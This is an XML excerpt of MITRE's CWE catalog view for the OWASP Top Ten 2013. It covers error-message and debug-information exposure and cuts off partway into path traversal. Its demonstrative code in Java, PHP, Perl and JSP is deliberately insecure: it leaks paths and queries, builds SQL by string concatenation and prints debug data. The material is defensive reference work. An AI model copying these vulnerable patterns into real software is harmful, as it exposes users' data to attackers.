<?xml version="1.0" encoding="UTF-8"?>
<Weakness_Catalog xmlns="http://cwe.mitre.org/cwe-6" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Name="VIEW LIST: CWE-928: Weaknesses in OWASP Top Ten (2013)" Version="3.0" Date="2017-11-08" xsi:schemaLocation="http://cwe.mitre.org/cwe-6 http://cwe.mitre.org/data/xsd/cwe_schema_v6.0.xsd">
   <Weaknesses>
      <Weakness ID="209" Name="Information Exposure Through an Error Message" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software generates an error message that includes sensitive information about its environment, users, or associated data.</Description>
         <Extended_Description>The sensitive information may be valuable information on its own (such as a password), or it may be useful for launching other, more deadly attacks. If an attack fails, an attacker may use error information provided by the server to launch another more focused attack. For example, an attempt to exploit a path traversal weakness (CWE-22) might yield the full pathname of the installed application. In turn, this could be used to select the proper number of ".." sequences to navigate to the targeted file. An attack using SQL injection (CWE-89) might not initially succeed, but an error message could reveal the malformed query, which would expose query logic and possibly even passwords or other sensitive information used within the query.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="755" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="PHP" Prevalence="Often"/>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>System Configuration</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Often this will either reveal sensitive information which may be used for a later attack or private information stored in the server.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>This weakness generally requires domain-specific interpretation using manual analysis. However, the number of potential error conditions may be too large to cover completely within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Analysis</Method>
               <Description>Automated methods may be able to detect certain idioms automatically, such as exposed stack traces or pathnames, but violation of business rules or privacy requirements is not typically feasible.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</xhtml:p>
                  <xhtml:p>Error conditions may be triggered with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-12">
               <Method>Manual Dynamic Analysis</Method>
               <Description>Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.</Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.</xhtml:p>
                  <xhtml:p>If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Handle exceptions internally and do not display errors containing potentially sensitive information to a user.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-33">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
               <Effectiveness_Notes>This makes it easier to spot places in the code where data is being used that is unencrypted.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-40">
               <Phase>Implementation</Phase>
               <Phase>Build and Compilation</Phase>
               <Strategy>Compilation or Build Hardening</Strategy>
               <Description>Debugging information should not make its way into a production release.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-40">
               <Phase>Implementation</Phase>
               <Phase>Build and Compilation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Debugging information should not make its way into a production release.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Where available, configure the environment to use less verbose error messages. For example, in PHP, disable the display_errors setting during configuration, or at runtime using the error_reporting() function.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Create default error pages or messages that do not leak any information.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following example, sensitive information might be printed depending on the exception that occurs.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>/.../</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>catch (Exception e) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>System.out.println(e);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>If an exception related to SQL is handled by the catch, then the output might contain sensitive information such as SQL query structure or private information. If this output is redirected to a web user, this may represent a security problem.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code tries to open a database connection, and prints any exceptions that occur.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>try {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>openDbConnection();</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:div>
                        <xhtml:i>//print exception message that includes exception message and configuration file location</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>catch (Exception $e) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>echo 'Caught exception: ', $e-&gt;getMessage(), '\n';<xhtml:br/>echo 'Check credentials in config file at: ', $Mysql_config_location, '\n';</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>If an exception occurs, the printed message exposes the location of the configuration file the script is using. An attacker can use this information to target the configuration file (perhaps exploiting a Path Traversal weakness). If the file can be read, the attacker could gain credentials for accessing the database. The attacker may also be able to replace the file with a malicious one, causing the application to use an arbitrary database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code generates an error message that leaks the full pathname of the configuration file.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>$ConfigDir = "/home/myprog/config";<xhtml:br/>$uname = GetUserInput("username");<xhtml:div>
                        <xhtml:i># avoid CWE-22, CWE-78, others.</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>ExitError("Bad hacker!") if ($uname !~ /^\w+$/);<xhtml:br/>$file = "$ConfigDir/$uname.txt";<xhtml:br/>if (! (-e $file)) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>ExitError("Error: $file does not exist");</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>public BankAccount getUserBankAccount(String username, String accountNumber) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>BankAccount userAccount = null;<xhtml:br/>String query = null;<xhtml:br/>try {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>if (isAuthorizedUser(username)) {<xhtml:div style="margin-left:10px;">
                                    <xhtml:div>query = "SELECT * FROM accounts WHERE owner = "<xhtml:br/>+ username + " AND accountID = " + accountNumber;<xhtml:br/>DatabaseManager dbManager = new DatabaseManager();<xhtml:br/>Connection conn = dbManager.getConnection();<xhtml:br/>Statement stmt = conn.createStatement();<xhtml:br/>ResultSet queryResult = stmt.executeQuery(query);<xhtml:br/>userAccount = (BankAccount)queryResult.getObject(accountNumber);</xhtml:div>
                                 </xhtml:div>
                                 <xhtml:br/>}</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>} catch (SQLException ex) {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>String logMessage = "Unable to retrieve account information from database,\nquery: " + query;<xhtml:br/>Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>}<xhtml:br/>return userAccount;</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection (CWE-89) to directly access the database.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-2049</Reference>
               <Description>POP3 server reveals a password in an error message after multiple APOP commands are sent. Might be resultant from another weakness.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2049</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5172</Reference>
               <Description>Program reveals password in error message if attacker can trigger certain database errors.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5172</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4638</Reference>
               <Description>Composite: application running with high privileges allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4638</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1579</Reference>
               <Description>Existence of user names can be determined by requesting a nonexistent blog and reading the error message.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1579</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1409</Reference>
               <Description>Direct request to library file in web application triggers pathname leak in error message.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1409</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3060</Reference>
               <Description>Malformed input to login page causes leak of full path when IMAP call fails.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3060</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0603</Reference>
               <Description>Malformed regexp syntax leads to information exposure in error message.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0603</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Accidental leaking of sensitive information through error messages</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Information Leakage and Improper Error Handling</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A7</Entry_ID>
               <Entry_Name>Improper Error Handling</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT Java Secure Coding">
               <Entry_ID>ERR01-J</Entry_ID>
               <Entry_Name>Do not allow exceptions to expose sensitive information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="214"/>
            <Related_Attack_Pattern CAPEC_ID="215"/>
            <Related_Attack_Pattern CAPEC_ID="463"/>
            <Related_Attack_Pattern CAPEC_ID="54"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-174"/>
            <Reference External_Reference_ID="REF-175" Section="Section 9.2, page 326."/>
            <Reference External_Reference_ID="REF-176" Section="Chapter 16, &#34;General Good Practices.&#34; Page 415"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 11: Failure to Handle Errors Correctly.&#34; Page&#xA;                  183"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 12: Information Leakage.&#34; Page 191"/>
            <Reference External_Reference_ID="REF-179"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 3, &#34;Overly Verbose Error Messages&#34;, Page&#xA;                  75."/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name, Potential_Mitigations, References, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2010-09-09</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2009-01-12">Error Message Information Leaks</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-12-28">Error Message Information Leak</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="215" Name="Information Exposure Through Debug Information" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The application contains debugging code that can expose sensitive information to untrusted parties.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Do not leave debug statements that could be executed in the source code. Assure that all debug information is eradicated before releasing the software.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following program changes its behavior based on a debug flag.</Intro_Text>
               <Example_Code Nature="bad" Language="JSP">
                  <xhtml:div>&lt;% if (Boolean.getBoolean("debugEnabled")) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>%&gt;<xhtml:br/>User account number: &lt;%= acctNo %&gt;<xhtml:br/>&lt;%<xhtml:br/>} %&gt;<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>The code writes sensitive debug information to the client browser if the "debugEnabled" flag is set to true .</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-2268</Reference>
               <Description>Password exposed in debug information.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2268</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0918</Reference>
               <Description>CGI script includes sensitive information in debug messages when an error is triggered.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0918</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1078</Reference>
               <Description>FTP client with debug option enabled shows password to the screen.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1078</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Infoleak Using Debug Information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Information Leakage and Improper Error Handling</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
            <Note Type="Relationship">This overlaps other categories.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Description, Name, Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2010-09-27">Information Leak Through Debug Information</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="22" Name="Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.</Description>
         <Extended_Description>
            <xhtml:p>Many file operations are intended to take place within a restricted directory. By using special elements such as ".." and "/" separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the "../" sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as "/usr/local/bin", which may also be useful in accessing unexpected files. This is referred to as absolute path traversal.</xhtml:p>
            <xhtml:p>In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to widen the scope of attack. For example, the software may add ".txt" to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Directory traversal</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Path traversal</Term>
               <Description>"Path traversal" is preferred over "directory traversal," but both terms are attack-focused.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.</Note>
            </Consequence>
